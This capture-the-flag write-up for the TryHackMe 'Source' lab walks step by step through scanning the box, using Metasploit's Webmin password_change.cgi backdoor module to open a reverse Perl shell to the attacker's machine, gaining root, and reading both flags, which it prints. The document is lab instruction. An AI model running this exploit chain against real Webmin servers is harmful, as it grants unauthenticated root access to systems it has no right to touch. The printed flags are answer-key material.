# Source

Exploit a recent vulnerability and hack Webmin, a web-based system configuration tool.

Enumerate and root the box attached to this task. Can you discover the source of the disruption and leverage it to take control?

This virtual machine is also included in the room AttackerKB as part of a guided experience. Additionally, you can download the OVA of Source for offline usage from https://www.darkstar7471.com/resources.html

# user.txt

## Services enumeration

Nmap discovers 2 ports, 1 of which being the webmin service that we are interested in.

~~~
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b7:4c:d0:bd:e2:7b:1b:15:72:27:64:56:29:15:ea:23 (RSA)
|   256 b7:85:23:11:4f:44:fa:22:00:8e:40:77:5e:cf:28:7c (ECDSA)
|_  256 a9:fe:4b:82:bf:89:34:59:36:5b:ec:da:c2:d3:95:ce (ED25519)
10000/tcp open  http    MiniServ 1.890 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
~~~

## Webmin authentication page

Connect to https://10.10.115.224:10000/ (Notice that webmin runs over port 10000 with SSL). You'll get the webmin authentication page.

After trying several authentication attempts involving the `admin` or `root` logins with common passwords, I decided to search for exploits.

## Exploit

Let's search for exploits in Metasploit:

~~~
kali@kali:/data/Source$ msfconsole -q
[*] Starting persistent handler(s)...
msf5 > search webmin

Matching Modules
================

   #  Name                                         Disclosure Date  Rank       Check  Description
   -  ----                                         ---------------  ----       -----  -----------
   0  auxiliary/admin/webmin/edit_html_fileaccess  2012-09-06       normal     No     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access
   1  auxiliary/admin/webmin/file_disclosure       2006-06-30       normal     No     Webmin File Disclosure
   2  exploit/linux/http/webmin_backdoor           2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor
   3  exploit/linux/http/webmin_packageup_rce      2019-05-16       excellent  Yes    Webmin Package Updates Remote Command Execution
   4  exploit/unix/webapp/webmin_show_cgi_exec     2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution
   5  exploit/unix/webapp/webmin_upload_exec       2019-01-17       excellent  Yes    Webmin Upload Authenticated RCE


Interact with a module by name or index, for example use 5 or use exploit/unix/webapp/webmin_upload_exec
~~~

There are several exploits that will require valid credentials, that we don't have. Let's use the `webmin_backdoor` exploit, which does not require credentials.

~~~
msf5 > use 2
[*] Using configured payload cmd/unix/reverse_perl
msf5 exploit(linux/http/webmin_backdoor) > show options

Module options (exploit/linux/http/webmin_backdoor):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      10000            yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       Base path to Webmin
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic (Unix In-Memory)

~~~

Now, let's set up a couple of mandatory variables, and run the exploit.

~~~
msf5 exploit(linux/http/webmin_backdoor) > set rhost 10.10.115.224
rhost => 10.10.115.224
msf5 exploit(linux/http/webmin_backdoor) > set ssl true
[!] Changing the SSL option's value may require changing RPORT!
ssl => true
msf5 exploit(linux/http/webmin_backdoor) > set rport 10000
rport => 10000
msf5 exploit(linux/http/webmin_backdoor) > set lhost 10.8.50.72
lhost => 10.8.50.72
msf5 exploit(linux/http/webmin_backdoor) > run
~~~

The exploit works and we get a shell.

~~~
[*] Started reverse TCP handler on 10.8.50.72:4444 
[*] Configuring Automatic (Unix In-Memory) target
[*] Sending cmd/unix/reverse_perl command payload
[*] Command shell session 1 opened (10.8.50.72:4444 -> 10.10.115.224:37464) at 2020-09-05 09:13:10 +0200

which python
/usr/bin/python
python -c "import pty;pty.spawn('/bin/bash')"
~~~

## Root shell

This exploit directly gives us a privileged shell and we don't even need a privesc:

~~~
root@source:/usr/share/webmin/# id
id
uid=0(root) gid=0(root) groups=0(root)
~~~

## User flag

Let's get the user flag:

~~~
root@source:/usr/share/webmin/# ls -l /home
ls -l /home
total 4
drwxr-xr-x 5 dark dark 4096 Jun 26 04:46 dark
root@source:/usr/share/webmin/# cat /home/dark/user.txt
cat /home/dark/user.txt
THM{SUPPLY_CHAIN_COMPROMISE}
~~~

# root.txt

And the root flag:

~~~
root@source:/usr/share/webmin/# cat /root/root.txt
cat /root/root.txt
THM{UPDATE_YOUR_INSTALL}
~~~
